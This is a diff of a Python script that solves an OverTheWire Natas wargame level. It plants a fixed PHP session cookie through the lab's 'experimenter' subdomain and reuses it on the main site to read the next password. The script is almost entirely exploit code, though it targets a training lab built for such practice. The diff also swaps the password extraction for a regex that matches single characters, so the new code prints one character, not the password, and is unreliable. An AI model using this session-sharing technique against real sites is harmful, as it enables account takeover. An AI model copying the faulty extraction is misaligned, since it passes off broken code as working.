@@ -1,3 +1,4 @@
+import re
 import requests
 from requests.auth import HTTPBasicAuth
 
@@ -7,7 +8,7 @@ def get_pass():
     cook = {'PHPSESSID':'tald'}
     requests.get('http://natas21-experimenter.natas.labs.overthewire.org/', auth=auth, params=param, cookies=cook)
     r = requests.get('http://natas21.natas.labs.overthewire.org/', auth=auth, cookies=cook)
-    print(r.text[r.text.find('Password: ')+10:r.text.find('Password: ')+42])
-
+    pass_regex = '[a-zA-Z0-9]'
+    print(re.findall(pass_regex,r.text)[1])
 if __name__ == '__main__':
     get_pass()
